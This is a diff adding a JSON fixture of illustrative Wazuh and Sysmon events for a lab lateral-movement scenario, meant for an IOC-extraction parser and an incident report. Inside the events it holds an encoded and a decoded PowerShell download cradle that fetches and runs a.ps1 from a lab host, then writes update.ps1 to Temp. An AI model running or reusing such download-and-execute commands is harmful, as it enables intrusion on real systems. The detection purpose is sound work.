@@ -1,0 +1,116 @@
+[
+  {
+    "_comment": "LAB EXEMPLAR event set for the T1021.006 -> T1059.001 kill chain. Shape mirrors Wazuh's decoded windows_eventchannel alerts (data.win.*). Timestamps are ILLUSTRATIVE, relative to a 2026-08-20T14:00Z reference run. Re-run the lab (docs/operator-guide.md) and export the real window to attack-emulation/raw-events.<date>.json to replace this. Consumed by scripts/parsers/sysmon_ioc_extractor.py and referenced by docs/incident-report.md.",
+    "timestamp": "2026-08-20T14:02:11.512Z",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Security-Auditing",
+          "channel": "Security",
+          "eventID": "4624",
+          "computer": "WIN01.lab.local",
+          "systemTime": "2026-08-20T14:02:11.512Z"
+        },
+        "eventdata": {
+          "logonType": "3",
+          "authenticationPackageName": "Kerberos",
+          "targetUserName": "svc_backup",
+          "targetDomainName": "LAB",
+          "ipAddress": "10.0.2.10",
+          "ipPort": "51344",
+          "logonProcessName": "Kerberos"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-08-20T14:02:13.874Z",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "eventID": "1",
+          "computer": "WIN01.lab.local",
+          "systemTime": "2026-08-20T14:02:13.874Z"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parentImage": "C:\\Windows\\System32\\wsmprovhost.exe",
+          "commandLine": "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMAAuADEALgAxADAALwBhAC4AcABzADEAJwApAA==",
+          "parentCommandLine": "C:\\Windows\\System32\\wsmprovhost.exe -Embedding",
+          "user": "LAB\\svc_backup",
+          "processId": "5312",
+          "processGuid": "{a1b2c3d4-0001-0000-0000-000000000001}",
+          "hashes": "SHA256=9F914D42706FE215501044ACD85A32D58AAEF1419D404FDDFA5D3B48F66CCD9F,MD5=04029E121A0CFA5991749937DD22A1D9",
+          "originalFileName": "PowerShell.EXE"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-08-20T14:02:15.031Z",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "eventID": "3",
+          "computer": "WIN01.lab.local",
+          "systemTime": "2026-08-20T14:02:15.031Z"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "protocol": "tcp",
+          "sourceIp": "10.0.2.20",
+          "sourcePort": "49771",
+          "destinationIp": "10.0.1.10",
+          "destinationPort": "80",
+          "destinationPortName": "http",
+          "user": "LAB\\svc_backup",
+          "processId": "5312"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-08-20T14:02:15.402Z",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-PowerShell",
+          "channel": "Microsoft-Windows-PowerShell/Operational",
+          "eventID": "4104",
+          "computer": "WIN01.lab.local",
+          "systemTime": "2026-08-20T14:02:15.402Z"
+        },
+        "eventdata": {
+          "scriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://10.0.1.10/a.ps1'); $b=[Convert]::FromBase64String($enc); [Text.Encoding]::UTF8.GetString($b) | Out-File -Encoding ascii C:\\Users\\svc_backup\\AppData\\Local\\Temp\\update.ps1",
+          "scriptBlockId": "b7c1e0a2-0000-0000-0000-000000000001",
+          "messageNumber": "1",
+          "messageTotal": "1"
+        }
+      }
+    }
+  },
+  {
+    "timestamp": "2026-08-20T14:02:16.660Z",
+    "data": {
+      "win": {
+        "system": {
+          "providerName": "Microsoft-Windows-Sysmon",
+          "channel": "Microsoft-Windows-Sysmon/Operational",
+          "eventID": "11",
+          "computer": "WIN01.lab.local",
+          "systemTime": "2026-08-20T14:02:16.660Z"
+        },
+        "eventdata": {
+          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "targetFilename": "C:\\Users\\svc_backup\\AppData\\Local\\Temp\\update.ps1",
+          "user": "LAB\\svc_backup",
+          "processId": "5312"
+        }
+      }
+    }
+  }
+]
